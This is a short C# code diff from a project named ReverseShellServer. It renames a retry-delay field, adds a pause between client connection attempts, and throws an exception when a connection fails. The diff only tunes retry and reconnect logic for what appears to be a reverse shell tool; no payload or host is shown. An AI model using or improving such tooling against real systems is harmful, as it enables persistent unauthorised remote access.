@@ -16,7 +16,12 @@ namespace ReverseShellServer
         /// <summary>
         /// Time in ms to wait for between each server contact
         /// </summary>
-        readonly int retryDelay = 5000;
+        readonly int serverRequestRetryDelay = 5000;
+
+        /// <summary>
+        /// Time in ms to wait between each client connection attempt
+        /// </summary>
+        readonly int clientConnectionRetryDelay = 2000;
 
         /// <summary>
         /// Number of times the server will try to connect to the client
@@ -77,11 +82,12 @@ namespace ReverseShellServer
                             if(ex.GetType() == typeof(ExitException)) break;
 
                             connectionRetryCount--;
+                            Thread.Sleep(clientConnectionRetryDelay);
                         }
                     }
                 }
 
-                Thread.Sleep(retryDelay);
+                Thread.Sleep(serverRequestRetryDelay);
             }
         }
 
@@ -97,7 +103,7 @@ namespace ReverseShellServer
             if (!networkManager.ConnectToClient(remoteAdress, remotePort))
             {
                 // The connection attempt wasn't successfull
-                return;
+                throw new NetworkException();
             }
 
             // Reset retry count
